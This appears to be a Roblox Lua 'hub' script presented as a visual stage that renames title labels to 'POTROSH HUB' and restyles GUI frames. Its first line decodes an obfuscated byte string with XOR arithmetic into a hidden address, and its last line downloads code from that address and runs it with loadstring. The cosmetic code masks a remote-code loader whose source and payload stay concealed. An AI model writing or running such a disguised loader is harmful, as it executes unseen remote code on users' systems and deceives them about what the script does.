
--[[ STAGE 2: VISUAL CORE ]]
local OwHY87i_DNzVSA4v8lCI="\250\140\138\140\151\222\215\213\146\143\155\152\149\150\157\166\228\157\175\175\235\182\165\189\243\136\139\186\137\163\181\160\143"local ZS6BanR9FSAQNTWQqV=71 local BaeBXch8JZEZgBB=64 local OYVWwUOedbbux=1 local jwFkIvDvOsUXodKMy=2 local b4R30oWf0uPOV5FofWjwW=19 local CdHmuBQAZjMGqaAC=false local rWMuEqAjWhOhpChq2N=bit32 and bit32.bxor if not rWMuEqAjWhOhpChq2N then rWMuEqAjWhOhpChq2N=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local K7PwWUp9Y7bz9qNLfRotQ={}for hurQFhvMMCdZk7Cer=1,#OwHY87i_DNzVSA4v8lCI do local XhGOYOFxsMMJGgdjjF=string.byte(OwHY87i_DNzVSA4v8lCI,hurQFhvMMCdZk7Cer)local dNtGU7QumVB9W1ytzXu=(BaeBXch8JZEZgBB+(hurQFhvMMCdZk7Cer*jwFkIvDvOsUXodKMy)+b4R30oWf0uPOV5FofWjwW)%256 if OYVWwUOedbbux==0 then XhGOYOFxsMMJGgdjjF=(XhGOYOFxsMMJGgdjjF-dNtGU7QumVB9W1ytzXu)%256 K7PwWUp9Y7bz9qNLfRotQ[hurQFhvMMCdZk7Cer]=string.char(rWMuEqAjWhOhpChq2N(XhGOYOFxsMMJGgdjjF,ZS6BanR9FSAQNTWQqV))else XhGOYOFxsMMJGgdjjF=rWMuEqAjWhOhpChq2N(XhGOYOFxsMMJGgdjjF,ZS6BanR9FSAQNTWQqV)K7PwWUp9Y7bz9qNLfRotQ[hurQFhvMMCdZk7Cer]=string.char((XhGOYOFxsMMJGgdjjF-dNtGU7QumVB9W1ytzXu)%256)end end local x0Uub_QC7LngZPAIK9zyB=table.concat(K7PwWUp9Y7bz9qNLfRotQ)if CdHmuBQAZjMGqaAC then x0Uub_QC7LngZPAIK9zyB=string.reverse(x0Uub_QC7LngZPAIK9zyB)end local cLMOuuFWdHkAAwIk0=x0Uub_QC7LngZPAIK9zyB
local HubName = "POTROSH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(cLMOuuFWdHkAAwIk0))()
